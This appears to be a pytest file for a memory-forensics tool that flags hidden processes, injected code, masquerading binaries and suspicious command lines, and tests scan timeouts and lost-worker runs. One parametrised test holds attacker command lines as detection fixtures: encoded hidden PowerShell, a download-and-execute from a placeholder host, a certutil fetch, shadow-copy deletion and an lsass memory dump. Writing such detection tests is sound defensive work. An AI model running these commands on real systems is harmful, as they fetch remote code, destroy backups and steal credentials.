"""Kairon's own Find Evil checks, MemProcFS stall handling, cmdscan shell history, lost-worker runs."""

from __future__ import annotations

import json
from types import SimpleNamespace

import pytest

from app.services.memory import kairon_findevil
from app.services.memory.artifact_normalizers import normalize_memprocfs_findevil, normalize_windows_consoles
from app.services.memory.kairon_findevil import findevil_indicators, run_kairon_findevil
from app.services.memory.volatility_runner import VolatilityRunnerError, VolatilityRunResult

BOOT = "2025-03-07T19:35:07+00:00"


def proc(pid, name, ppid, created="2025-03-07T19:36:00+00:00", **extra):
    return {"PID": pid, "ImageFileName": name, "PPID": ppid, "CreateTime": created, "ExitTime": None, "Threads": 4, **extra}


SYSTEM = [
    proc(4, "System", 0, BOOT),
    proc(400, "smss.exe", 4, BOOT),
    proc(648, "wininit.exe", 548, "2025-03-07T19:35:09+00:00"),
    proc(784, "services.exe", 648, "2025-03-07T19:35:09+00:00"),
    proc(804, "lsass.exe", 648, "2025-03-07T19:35:09+00:00"),
    proc(916, "svchost.exe", 784, "2025-03-07T19:35:10+00:00"),
    # PID 548 was reused by a later svchost: it is not wininit's real parent.
    proc(548, "svchost.exe", 784, "2025-03-07T19:35:11+00:00"),
    proc(4744, "explorer.exe", 4656, "2025-03-07T19:35:17+00:00"),
]


def by_type(indicators):
    out = {}
    for item in indicators:
        out.setdefault(item["Type"], []).append(item)
    return out


def test_a_clean_process_tree_has_no_process_indicators() -> None:
    assert findevil_indicators(pslist=SYSTEM, psscan=SYSTEM, cmdline=[]) == []


def test_hidden_process_is_flagged_and_leftovers_are_not() -> None:
    psscan = [
        *SYSTEM,
        {"PID": 2192, "ImageFileName": "svchost.exe", "PPID": 784, "CreateTime": "2025-03-07T19:37:35+00:00", "ExitTime": None, "Threads": 5, "Offset(V)": 0xE009224A0080},
        # From before this boot, no threads: a leftover structure, not a process.
        {"PID": 2044, "ImageFileName": "svchost.\x01", "PPID": 776, "CreateTime": "2025-03-07T19:08:50+00:00", "ExitTime": None, "Threads": 0},
        {"PID": 6372, "ImageFileName": "taskhostw.exe", "PPID": 916, "CreateTime": "2025-03-07T19:39:44+00:00", "ExitTime": "2025-03-07T19:39:44+00:00", "Threads": 0},
    ]
    found = by_type(findevil_indicators(pslist=SYSTEM, psscan=psscan))
    assert [item["PID"] for item in found["PROC_NOLINK"]] == [2192]
    assert "services.exe" in found["PROC_NOLINK"][0]["Description"] and found["PROC_NOLINK"][0]["Address"] == "0xe009224a0080"
    assert [item["PID"] for item in found["PROC_TERMINATED"]] == [6372]


def test_unexpected_parents_ignore_reused_parent_pids() -> None:
    pslist = [*SYSTEM, proc(5000, "lsass.exe", 4744), proc(5100, "svchost.exe", 4744)]
    found = by_type(findevil_indicators(pslist=pslist))
    assert sorted(item["PID"] for item in found["PROC_PARENT"]) == [5000, 5100]
    # wininit's parent PID 548 belongs to a later svchost (PID reuse): not reported.
    assert 648 not in [item["PID"] for item in found["PROC_PARENT"]]
    assert sorted(item["PID"] for item in found["PROC_DUPLICATE"]) == [804, 5000]


def test_masquerading_names_and_paths() -> None:
    pslist = [*SYSTEM, proc(6000, "scvhost.exe", 4744), proc(6100, "svchost.exe", 784), proc(6200, "taskhost.exe", 916)]
    cmdline = [{"PID": 6100, "Args": "C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe -k netsvcs"}, {"PID": 916, "Args": "C:\\WINDOWS\\system32\\svchost.exe -k DcomLaunch -p"}]
    found = by_type(findevil_indicators(pslist=pslist, cmdline=cmdline))
    assert [item["PID"] for item in found["PROC_NAME"]] == [6000]
    assert [item["PID"] for item in found["PROC_PATH"]] == [6100]
    assert [(item["PID"], item["Priority"]) for item in found["PROC_LOCATION"]] == [(6100, "medium")]


def test_shell_started_by_an_office_application() -> None:
    pslist = [*SYSTEM, proc(7000, "WINWORD.EXE", 4744), proc(7100, "powershell.exe", 7000, "2025-03-07T19:37:00+00:00"), proc(7200, "cmd.exe", 4744)]
    found = by_type(findevil_indicators(pslist=pslist))
    assert [item["PID"] for item in found["PROC_SPAWN"]] == [7100]


@pytest.mark.parametrize(
    ("command", "priority"),
    [
        ("powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "high"),
        ("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\"", "high"),
        ("certutil.exe -urlcache -split -f http://x/a.exe a.exe", "high"),
        ("vssadmin.exe delete shadows /all /quiet", "high"),
        ("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 804 C:\\t\\l.dmp full", "high"),
        ("schtasks /create /tn x /tr C:\\x.exe /sc onlogon", "medium"),
        ("cmd.exe /c whoami /all", "low"),
    ],
)
def test_suspicious_command_lines(command, priority) -> None:
    found = by_type(findevil_indicators(pslist=[*SYSTEM, proc(8000, "x.exe", 4744)], cmdline=[{"PID": 8000, "Args": command}]))
    assert found["CMDLINE"][0]["Priority"] == priority and command[:40] in found["CMDLINE"][0]["Description"]


def test_ordinary_command_lines_are_not_flagged() -> None:
    cmdline = [
        {"PID": 916, "Args": "C:\\WINDOWS\\system32\\svchost.exe -k DcomLaunch -p"},
        {"PID": 4744, "Args": "C:\\WINDOWS\\Explorer.EXE"},
        {"PID": 9000, "Args": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --enable-features=x"},
        {"PID": 9100, "Args": "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"},
    ]
    assert "CMDLINE" not in by_type(findevil_indicators(pslist=SYSTEM, cmdline=cmdline))


def test_injected_code_and_unlinked_modules() -> None:
    malfind = [
        {"PID": 5000, "Process": "notepad.exe", "Start VPN": 0x1A0000, "Protection": "PAGE_EXECUTE_READWRITE", "Hexdump": "4d 5a 90 00 03 00 00 00  MZ......"},
        {"PID": 5000, "Process": "notepad.exe", "Start VPN": 0x2A0000, "Protection": "PAGE_EXECUTE_READWRITE", "Hexdump": "fc 48 83 e4 f0 e8"},
        {"PID": 3088, "Process": "MsMpEng.exe", "Start VPN": 0x3A0000, "Protection": "PAGE_EXECUTE_READWRITE", "Hexdump": "55 48 8b ec"},
    ]
    ldrmodules = [
        {"Pid": 5000, "Process": "notepad.exe", "Base": 0x7FF0000, "InLoad": False, "InInit": False, "InMem": False, "MappedPath": "\\Users\\bob\\AppData\\Local\\Temp\\evil.dll"},
        {"Pid": 5000, "Process": "notepad.exe", "Base": 0x7FE0000, "InLoad": False, "InInit": False, "InMem": False, "MappedPath": ""},
        # Windows maps resource DLLs as data, outside the loader lists: normal.
        {"Pid": 1128, "Process": "svchost.exe", "Base": 0x23E0000, "InLoad": False, "InInit": False, "InMem": False, "MappedPath": "\\Windows\\System32\\winnlsres.dll"},
        {"Pid": 5000, "Process": "notepad.exe", "Base": 0x7FD0000, "InLoad": True, "InInit": True, "InMem": True, "MappedPath": "\\Users\\bob\\x.dll"},
    ]
    found = by_type(findevil_indicators(malfind=malfind, ldrmodules=ldrmodules))
    assert [item["Address"] for item in found["PE_INJECT"]] == ["0x1a0000"]
    assert [(item["Process"], item["Priority"]) for item in found["PRIVATE_RWX"]] == [("notepad.exe", "medium"), ("MsMpEng.exe", "low")]
    assert sorted((item["Address"], item.get("Priority")) for item in found["PE_NOLINK"]) == [("0x7fe0000", "high"), ("0x7ff0000", None)]


def test_normalizer_uses_the_row_priority_when_given() -> None:
    rows = findevil_indicators(malfind=[{"PID": 1, "Process": "msedge.exe", "Start VPN": 1, "Protection": "PAGE_EXECUTE_READWRITE", "Hexdump": "00"}], pslist=[*SYSTEM], psscan=[*SYSTEM, {"PID": 2192, "ImageFileName": "svchost.exe", "PPID": 784, "CreateTime": "2025-03-07T19:37:35+00:00", "ExitTime": None, "Threads": 5}])
    result = normalize_memprocfs_findevil(rows, case_id="c", evidence_id="e", scan_run_id="r", plugin_run_id="p", source_plugin="kairon.findevil")
    priorities = {item["indicator_type"]: item["review_priority"] for item in result["items"]}
    assert priorities == {"PROC_NOLINK": "high", "PRIVATE_RWX": "low"}
    assert {item["source_plugin"] for item in result["items"]} == {"kairon.findevil"}


def test_runner_keeps_the_checks_whose_plugins_ran(tmp_path, monkeypatch) -> None:
    from app.services.memory import volatility_runner

    outputs = {
        "windows.pslist": SYSTEM,
        "windows.psscan": [*SYSTEM, {"PID": 2192, "ImageFileName": "svchost.exe", "PPID": 784, "CreateTime": "2025-03-07T19:37:35+00:00", "ExitTime": None, "Threads": 5}],
        "windows.cmdline": [],
    }

    def fake_run_plugin(plugin, evidence_path, work_dir, **kwargs):
        if plugin not in outputs:
            raise VolatilityRunnerError("PLUGIN_TIMEOUT", f"{plugin} timed out")
        return VolatilityRunResult(argv_display=[plugin], stdout=json.dumps(outputs[plugin]).encode(), stderr=b"", duration_ms=1)

    monkeypatch.setattr(volatility_runner, "run_plugin", fake_run_plugin)
    result = run_kairon_findevil(tmp_path / "image.dmp", tmp_path, timeout_seconds=600, max_output_bytes=1 << 20, plugin_timeout=lambda plugin: 60)
    rows = json.loads(result.stdout)
    assert [row["Type"] for row in rows] == ["PROC_NOLINK"]
    assert b"windows.malfind: PLUGIN_TIMEOUT" in result.stderr

    outputs.clear()
    with pytest.raises(VolatilityRunnerError) as raised:
        run_kairon_findevil(tmp_path / "image.dmp", tmp_path, timeout_seconds=600, max_output_bytes=1 << 20, plugin_timeout=lambda plugin: 60)
    assert raised.value.code == "PLUGIN_FAILED"


def test_execution_sends_kairon_findevil_to_its_runner(tmp_path, monkeypatch) -> None:
    from app.services.memory import execution

    def fake_kairon(evidence_path, work_dir, **kwargs):
        assert kwargs["plugin_timeout"]("windows.malfind") == 1800
        return VolatilityRunResult(argv_display=["kairon-findevil"], stdout=b"[]", stderr=b"", duration_ms=3)

    monkeypatch.setattr(execution, "run_kairon_findevil", fake_kairon)

    class _Db:
        def commit(self):
            pass

        def refresh(self, obj):
            pass

    plugin_run = SimpleNamespace(status=None, started_at=None, metadata_json={})
    payload, _raw, _ms, argv = execution._execute_plugin(_Db(), SimpleNamespace(cancellation_requested=False), plugin_run, "kairon.findevil", tmp_path / "image.dmp", tmp_path)
    assert payload == [] and argv == ["kairon-findevil"]


# --- MemProcFS: a scan that stops making progress ends, and does not wait in VMMDLL_Close ---


def test_memprocfs_child_gives_up_on_a_stalled_scan(monkeypatch, capsys) -> None:
    from app.services.memory import memprocfs_findevil as child

    class _Lib:
        closed = False

        def VMMDLL_Initialize(self, count, options):
            return 1

        def VMMDLL_InitializePlugins(self, handle):
            return True

        def VMMDLL_Close(self, handle):
            _Lib.closed = True

    clock = {"now": 0.0}
    monkeypatch.setattr(child._Watchdog, "start", lambda self: None)  # checks run from the loop here
    monkeypatch.setattr(child, "_die_with_parent", lambda: None)
    monkeypatch.setattr(child, "_load", lambda library: _Lib())
    monkeypatch.setattr(child, "_read", lambda lib, handle, path, limit: b"90")
    monkeypatch.setattr(child.time, "monotonic", lambda: clock["now"])
    monkeypatch.setattr(child.time, "sleep", lambda seconds: clock.__setitem__("now", clock["now"] + seconds))

    closed_at_exit = []

    def fake_exit(code):
        closed_at_exit.append(_Lib.closed)
        raise SystemExit(code)

    monkeypatch.setattr(child.os, "_exit", fake_exit)
    with pytest.raises(SystemExit) as exited:
        child.main(["--library", "vmm.so", "--evidence", "image.dmp", "--scan-timeout", "1500", "--stall-timeout", "60"])
    assert exited.value.code == child.EXIT_FORENSIC_UNAVAILABLE
    assert clock["now"] < 120  # gave up after the stall window, not after the whole scan timeout
    assert closed_at_exit == [False]  # left without VMMDLL_Close, which would wait forever
    assert "stopped making progress at 90%" in capsys.readouterr().err


def test_memprocfs_watchdog_thread_ends_a_child_stuck_in_native_code(tmp_path) -> None:
    """The main thread never comes back from the library; the watchdog thread still ends it."""
    import subprocess
    import sys
    import textwrap

    script = tmp_path / "stuck.py"
    script.write_text(textwrap.dedent("""
        import time
        from app.services.memory import memprocfs_findevil as child
        watchdog = child._Watchdog(scan_timeout=1, stall_timeout=600)
        watchdog.start()
        time.sleep(60)  # stands in for a MemProcFS call that never returns
    """))
    started = __import__("time").monotonic()
    import os
    from pathlib import Path

    backend = str(Path(__file__).resolve().parents[1])
    done = subprocess.run([sys.executable, str(script)], capture_output=True, timeout=30, cwd=backend, env={**os.environ, "PYTHONPATH": backend})
    assert done.returncode == 5
    assert __import__("time").monotonic() - started < 20
    assert b"did not finish in time" in done.stderr


# --- Shell history: windows.cmdscan rows and duplicates of windows.consoles ---

CMDSCAN = [
    {
        "PID": 8500, "Process": "conhost.exe", "Property": "_COMMAND_HISTORY", "Data": "None",
        "__children": [
            {"PID": 8500, "Process": "conhost.exe", "Property": "_COMMAND_HISTORY.Application", "Data": "cmd.exe", "__children": []},
            {"PID": 8500, "Process": "conhost.exe", "Property": "_COMMAND_HISTORY.CommandCount", "Data": "2", "__children": []},
            {"PID": 8500, "Process": "conhost.exe", "Property": "_COMMAND_HISTORY.CommandBucket_Command_0", "Data": "whoami", "__children": []},
            {"PID": 8500, "Process": "conhost.exe", "Property": "_COMMAND_HISTORY.CommandBucket_Command_1", "Data": "net user", "__children": []},
        ],
    }
]


def test_cmdscan_commands_are_shell_history() -> None:
    result = normalize_windows_consoles(CMDSCAN, case_id="c", evidence_id="e", scan_run_id="r", plugin_run_id="p", source_plugin="windows.cmdscan")
    assert [(item["pid"], item["process_name"], item["command"], item["recovered_from"]) for item in result["items"]] == [
        (8500, "cmd.exe", "whoami", "command_history"),
        (8500, "cmd.exe", "net user", "command_history"),
    ]


def test_commands_found_by_both_console_plugins_are_kept_once() -> None:
    from app.services.memory.execution import _drop_repeated_console_commands

    common = {"case_id": "c", "evidence_id": "e", "scan_run_id": "r", "plugin_run_id": "p"}
    consoles = {"items": [{"pid": 8500, "command": "whoami"}], "accepted_count": 1}
    cmdscan = normalize_windows_consoles(CMDSCAN, source_plugin="windows.cmdscan", **common)
    results = {"windows.consoles": consoles, "windows.cmdscan": cmdscan}
    _drop_repeated_console_commands(results)
    assert [item["command"] for item in results["windows.cmdscan"]["items"]] == ["net user"]
    assert results["windows.cmdscan"]["accepted_count"] == 1


# --- Runs left "running" by a worker that died ---


def test_fail_orphaned_runs_with_fake_session(monkeypatch) -> None:
    from app.services.memory import execution

    lost_plugin = SimpleNamespace(status="running", completed_at=None, error_code=None, error_message=None)
    done_plugin = SimpleNamespace(status="completed", completed_at=None, error_code=None, error_message=None)
    lost = SimpleNamespace(id="lost", status="running", worker_task_id="job-lost", metadata_json={"progress": {"current_plugin": "memprocfs.findevil"}}, plugin_runs=[done_plugin, lost_plugin], completed_at=None, error_log={})
    alive = SimpleNamespace(id="alive", status="running", worker_task_id="job-alive", metadata_json={}, plugin_runs=[], completed_at=None, error_log={})

    class _Query:
        def filter(self, *args):
            return self

        def all(self):
            return [lost, alive]

    class _Session:
        committed = False

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def query(self, model):
            return _Query()

        def commit(self):
            _Session.committed = True

    monkeypatch.setattr(execution, "SessionLocal", _Session)
    assert execution.fail_orphaned_memory_runs("current", lambda job_id: job_id == "job-alive") == 1
    assert (lost.status, lost.error_log["code"]) == ("failed", "WORKER_LOST")
    assert "memprocfs.findevil" in lost.error_log["message"]
    assert (lost_plugin.status, done_plugin.status) == ("failed", "completed")
    assert alive.status == "running" and _Session.committed


# --- One row when both tools report the same indicator ---


def test_indicators_reported_by_both_tools_are_merged() -> None:
    from app.services.memory.execution import _merge_findevil_sources

    common = {"case_id": "c", "evidence_id": "e", "scan_run_id": "r", "plugin_run_id": "p"}
    kairon = normalize_memprocfs_findevil(
        [{"PID": 2192, "Process": "svchost.exe", "Type": "PROC_NOLINK", "Address": "0xe009224a0080", "Description": "hidden"}],
        source_plugin="kairon.findevil", **common,
    )
    memprocfs = normalize_memprocfs_findevil(
        [
            {"PID": "2192", "Process": "svchost.exe", "Type": "PROC_NOLINK", "Address": "0xffffe009224a0080", "Description": ""},
            {"PID": "2192", "Process": "svchost.exe", "Type": "PEB_BAD_LDR", "Address": "0x0", "Description": ""},
        ],
        source_plugin="memprocfs.findevil", **common,
    )
    results = {"kairon.findevil": kairon, "memprocfs.findevil": memprocfs}
    _merge_findevil_sources(results)
    assert [(item["indicator_type"], item["sources"]) for item in results["kairon.findevil"]["items"]] == [("PROC_NOLINK", ["kairon.findevil", "memprocfs.findevil"])]
    assert [(item["indicator_type"], item["sources"]) for item in results["memprocfs.findevil"]["items"]] == [("PEB_BAD_LDR", ["memprocfs.findevil"])]
    assert results["memprocfs.findevil"]["accepted_count"] == 1


@pytest.mark.parametrize(
    ("description", "priority"),
    [
        ("Process base address mismatch: PEB.ImageBaseAddress != EPROCESS.SectionBaseAddress (0x140 != 0x7ff67a590000)", "low"),
        ("Process base address mismatch: PEB.ImageBaseAddress != EPROCESS.SectionBaseAddress (0x400000 != 0x7ff67a590000)", "high"),
    ],
)
def test_process_base_mismatch_with_an_unreadable_peb_is_low(description, priority) -> None:
    result = normalize_memprocfs_findevil([{"PID": "6640", "Process": "x.exe", "Type": "PROC_BASEADDR", "Address": "0x0", "Description": description}], case_id="c", evidence_id="e", scan_run_id="r", plugin_run_id="p")
    assert result["items"][0]["review_priority"] == priority


def test_api_closes_lost_runs_before_refusing_a_new_one(monkeypatch) -> None:
    from app.api import routes_memory
    from app.services.memory import execution

    calls = []
    monkeypatch.setattr(execution, "fail_orphaned_memory_runs", lambda current, alive: calls.append(current) or 1)

    class _Db:
        expired = False

        def expire_all(self):
            _Db.expired = True

    assert routes_memory._close_lost_memory_runs(_Db()) == 1
    assert calls == [""] and _Db.expired
